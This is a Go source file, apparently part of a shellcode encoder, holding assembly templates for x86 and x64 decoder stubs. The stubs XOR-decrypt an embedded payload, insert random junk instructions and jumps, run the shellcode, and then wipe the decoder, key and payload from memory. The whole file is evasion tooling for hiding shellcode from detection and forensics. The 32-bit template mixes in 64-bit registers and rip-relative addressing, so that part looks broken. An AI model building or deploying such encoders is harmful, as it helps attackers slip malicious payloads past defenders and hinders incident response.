package ssce

import (
	"encoding/hex"
	"fmt"
	"strings"
)

var x86MiniDecoder = `
.code32

header:
  // eax store the random seed
  // ebx store the crypto key
  // ecx store the loop times
  // edx store the xor shift median
  // esi store the body address
  // edi store the current value

  // save context
  pushad
  pushfd

  mov eax, {{hex .Seed}}
  mov ebx, {{hex .Key}}

  // prevent continuous 0x00
  mov ecx, {{hex .NumLoopStub}}
  xor ecx, {{hex .NumLoopMaskA}}
  xor ecx, {{hex .NumLoopMaskB}}

  // calculate the body address
  lea rsi, [rip + body + {{hex .OffsetT}}]
  // prevent continuous 0x00
  add rsi, {{hex .OffsetA}}
  sub rsi, {{hex .OffsetS}}

 loop_xor:
  // xor block data
  mov edi, [esi]
  ror edi, 5
  xor edi, eax
  rol edi, 17
  xor edi, ebx
  mov [esi], edi

  // xor shift 32
  // seed ^= seed << 13
  // seed ^= seed >> 17
  // seed ^= seed << 5
  mov edx, eax
  shl edx, 13
  xor eax, edx
  mov edx, eax
  shr edx, 17
  xor eax, edx
  mov edx, eax
  shl edx, 5
  xor eax, edx

  // update address and counter
  add esi, 4
  dec ecx
  jnz loop_xor

  // restore context
  popfd
  popad

body:
`

var x64MiniDecoder = `
.code64

header:
  push rax      // store the random seed
  push rbx      // store the crypto key
  push rcx      // store the loop times
  push rdx      // store the xor shift median
  push rsi      // store the body address
  push rdi      // store the current value
  pushfq        // store the flag register

  mov rax, {{hex .Seed}}
  mov rbx, {{hex .Key}}

  // prevent continuous 0x00
  mov rcx, {{hex .NumLoopStub}}
  xor rcx, {{hex .NumLoopMaskA}}
  xor rcx, {{hex .NumLoopMaskB}}

  // calculate the body address
  lea rsi, [rip + body + {{hex .OffsetT}}]
  // prevent continuous 0x00
  add rsi, {{hex .OffsetA}}
  sub rsi, {{hex .OffsetS}}

 loop_xor:
  // xor block data
  mov rdi, [rsi]
  ror rdi, 17
  xor rdi, rax
  rol rdi, 7
  xor rdi, rbx
  mov [rsi], rdi

  // xor shift 64
  // seed ^= seed << 13
  // seed ^= seed >> 7
  // seed ^= seed << 17
  mov rdx, rax
  shl rdx, 13
  xor rax, rdx
  mov rdx, rax
  shr rdx, 7
  xor rax, rdx
  mov rdx, rax
  shl rdx, 17
  xor rax, rdx

  // update address and counter
  add rsi, 8
  dec rcx
  jnz loop_xor

  popfq
  pop rdi
  pop rsi
  pop rdx
  pop rcx
  pop rbx
  pop rax

body:
`

type miniDecoderCtx struct {
	Seed interface{}
	Key  interface{}

	NumLoopStub  int32
	NumLoopMaskA int32
	NumLoopMaskB int32

	OffsetT int32
	OffsetA int32
	OffsetS int32
}

var x86asm = `
.code32

entry:
  ret
`

var x64asm = `
.code64

entry:
  // save context and prepare the environment
  {{db .JumpShort}}                          // random jump short
  {{db .SaveContext}}                        // save GP registers
  push rbx                         {{igi}}   // store rbx for save entry address
  push rbp                         {{igi}}   // store rbp for save stack address
  mov rbp, rsp                     {{igi}}   // create new stack frame
  and rsp, 0xFFFFFFFFFFFFFFF0      {{igi}}   // ensure stack is 16 bytes aligned
  sub rsp, 0x200                   {{igi}}   // reserve stack
  fxsave [rsp]                     {{igi}}   // save FP registers

  // calculate the entry address
  {{igi}}                          {{igi}}
  call calc_entry_addr
  flag_CEA:
  {{igi}}                          {{igi}}

  // decode instructions in stub and erase them

  {{db .SaveRegister}}
  call decode_stubs                {{igi}}
  call decode_shellcode            {{igi}}
  call erase_decoder_stub          {{igi}}
  call erase_crypto_key_stub       {{igi}}
  {{db .RestoreRegister}}

  // execute the shellcode
  sub rsp, 0x80                    {{igi}}   // reserve stack
  call shellcode_stub              {{igi}}   // call the shellcode
  add rsp, 0x80                    {{igi}}   // restore stack
 
  // erase the remaining instructions
  push rax                         {{igi}}   // save the shellcode return value
  call erase_shellcode_stub        {{igi}}
  call erase_eraser_stub           {{igi}}
  pop rax                          {{igi}}   // restore the shellcode return value

  fxrstor [rsp]                    {{igi}}   // restore FP registers
  add rsp, 0x200                   {{igi}}   // reserve stack
  mov rsp, rbp                     {{igi}}   // restore stack address
  pop rbp                          {{igi}}   // restore rbp
  pop rbx                          {{igi}}   // restore rbx
  {{db .RestoreContext}}                     // restore GP registers
  ret                              {{igi}}
  
// calculate the shellcode entry address.
calc_entry_addr:
  pop rax                          {{igi}}   // get return address
  mov rbx, rax                     {{igi}}   // calculate entry address
  sub rbx, flag_CEA                {{igi}}   // fix bug for assembler
  push rax                         {{igi}}   // push return address
  ret                              {{igi}}   // return to the entry

// rcx = data address, rdx = data length, r8 = key.
// this function assumes that the data length is divisible by 8.
mini_xor:
  shr rdx, 3                       {{igi}}   // rcx = rcx / 8
  loop_xor:                        {{igi}}
  xor [rcx], r8                    {{igi}}
  add rcx, 8                       {{igi}}
  dec rdx                          {{igi}}
  jnz loop_xor                     {{igi}}
  ret                              {{igi}}

decode_stubs:
  lea rcx, [rbx + decoder_stub]              {{igi}}
  mov rdx, eraser_stub - decoder_stub        {{igi}}
  mov r8, {{hex .DecoderStubKey}}            {{igi}}
  call mini_xor                              {{igi}}

  lea rcx, [rbx + eraser_stub]               {{igi}}
  mov rdx, crypto_key_stub - eraser_stub     {{igi}}
  mov r8, {{hex .EraserStubKey}}             {{igi}}
  call mini_xor                              {{igi}}

  lea rcx, [rbx + crypto_key_stub]           {{igi}}
  mov rdx, shellcode_stub - crypto_key_stub  {{igi}}
  mov r8, {{hex .CryptoKeyStubKey}}          {{igi}}
  call mini_xor                              {{igi}}
  ret

decode_shellcode:
  lea rcx, [rbx + shellcode_stub]  {{igi}}
  mov rdx, {{hex .ShellcodeLen}}   {{igi}}
  lea r8, [rbx + crypto_key_stub]  {{igi}}
  mov r9, {{hex .CryptoKeyLen}}    {{igi}}
  sub rsp, 0x40                    {{igi}}
  call decoder_stub                {{igi}}
  add rsp, 0x40                    {{igi}}
  ret                              {{igi}}

// TODO merge the next func
erase_decoder_stub:
  lea rcx, [rbx + decoder_stub]              {{igi}}
  mov rdx, eraser_stub - decoder_stub        {{igi}}
  call eraser_stub                           {{igi}}
  ret                                        {{igi}}

erase_crypto_key_stub:
  lea rcx, [rbx + crypto_key_stub]           {{igi}}
  mov rdx, shellcode_stub - crypto_key_stub  {{igi}}
  call eraser_stub                           {{igi}}
  ret                                        {{igi}}

erase_shellcode_stub:
  // test rax, rax
  // jmp skip_erase
  lea rcx, [rbx + shellcode_stub]            {{igi}}
  mov rdx, {{hex .ShellcodeLen}}             {{igi}}
  call eraser_stub                           {{igi}}
  skip_erase:
  ret                                        {{igi}}

erase_eraser_stub:
  ret                                        {{igi}}

decoder_stub:
  {{db .DecoderStub}}                        {{igi}}

eraser_stub:
  {{db .EraserStub}}                         {{igi}}

crypto_key_stub:
  {{db .CryptoKeyStub}}                      {{igi}}

shellcode_stub:
`

type asmContext struct {
	JumpShort      []byte
	SaveContext    []byte
	RestoreContext []byte

	SaveRegister     []byte
	RestoreRegister  []byte
	DecoderStubKey   interface{}
	EraserStubKey    interface{}
	CryptoKeyStubKey interface{}

	DecoderStub   []byte
	EraserStub    []byte
	CryptoKeyStub []byte
	CryptoKeyLen  int
	ShellcodeLen  int
}

func toDB(b []byte) string {
	if len(b) == 0 {
		return ""
	}
	builder := strings.Builder{}
	builder.WriteString(".byte ")
	for i := 0; i < len(b); i++ {
		builder.WriteString("0x")
		s := hex.EncodeToString([]byte{b[i]})
		builder.WriteString(strings.ToUpper(s))
		builder.WriteString(", ")
	}
	return builder.String()
}

func toHex(v interface{}) string {
	return fmt.Sprintf("0x%X", v)
}
